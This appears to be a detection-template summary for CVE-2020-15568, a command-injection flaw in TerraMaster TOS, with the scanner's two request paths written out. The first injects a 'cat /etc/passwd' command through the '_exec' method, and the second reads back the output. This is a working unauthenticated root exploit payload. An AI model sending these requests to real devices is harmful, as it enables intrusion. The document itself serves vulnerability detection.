---
cve_id: CVE-2020-15568
template_path: nuclei-templates/http/cves/2020/CVE-2020-15568.yaml
affected_product: TerraMaster TOS
severity: critical
authentication: none
external_callback: false
affected_versions: before 4.1.29
preconditions: []
poc_classification: rce
---

## Vulnerability
TerraMaster TOS before 4.1.29 has invalid parameter checking that leads to code injection as root. This is a dynamic class method invocation vulnerability in `include/exportUser.php`, in which an attacker can trigger a call to the `exec` method with arbitrary OS commands in the `opt` parameter. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8). CWE-913.

## PoC / Detection
Classification: rce  
The template performs a two-step exploit probe:  
1. `GET /include/exportUser.php?type=3&cla=application&func=_exec&opt=(cat%20/etc/passwd)%3E{{rand}}.txt` — injects command execution via the `_exec` method to write `/etc/passwd` to a random file on disk.  
2. `GET /include/{{rand}}.txt` — retrieves the file and matches regex `root:.*:0:0:` (plus HTTP 200) to confirm root-level RCE succeeded.

## References
- https://ssd-disclosure.com/ssd-advisory-terramaster-os-exportuser-php-remote-code-execution/
- https://nvd.nist.gov/vuln/detail/CVE-2020-15568
- https://help.terra-master.com/TOS/view/
- https://github.com/divinepwner/TerraMaster-TOS-CVE-2020-15568
- https://github.com/n0bugz/CVE-2020-15568
